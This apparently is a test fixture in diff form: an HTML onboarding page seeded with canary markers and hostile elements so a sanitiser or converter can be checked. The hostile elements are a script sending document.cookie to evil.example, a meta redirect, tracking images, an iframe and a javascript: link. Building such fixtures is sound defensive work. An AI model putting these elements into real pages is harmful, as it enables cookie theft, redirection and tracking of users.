@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Head title is not used</title>
+  <meta http-equiv="refresh" content="0; url=https://evil.example/">
+  <link rel="stylesheet" href="https://evil.example/style.css">
+  <style>body { background: url(https://evil.example/track.png) }</style>
+  <script>fetch("https://evil.example/?c=" + document.cookie)</script>
+</head>
+<body>
+  <!-- internal note: CANARY-COMMENT -->
+  <h1>Onboarding guide</h1>
+  <p>Welcome <b>aboard</b>. Read the <a href="https://intranet.example/handbook">handbook</a>
+     and ignore <a href="javascript:alert(1)">this link</a>.</p>
+  <img src="https://evil.example/pixel.png" alt="team photo">
+  <iframe src="https://evil.example/frame"></iframe>
+  <h2>First week</h2>
+  <ul><li>Meet your manager</li><li>Set up your laptop</li></ul>
+  <pre><code>ssh dev.example</code></pre>
+  <table><tr><th>Day</th><th>Task</th></tr><tr><td>Mon</td><td>Badge</td></tr></table>
+  <script>document.write("CANARY-SCRIPT")</script>
+  <noscript>CANARY-NOSCRIPT</noscript>
+</body>
+</html>
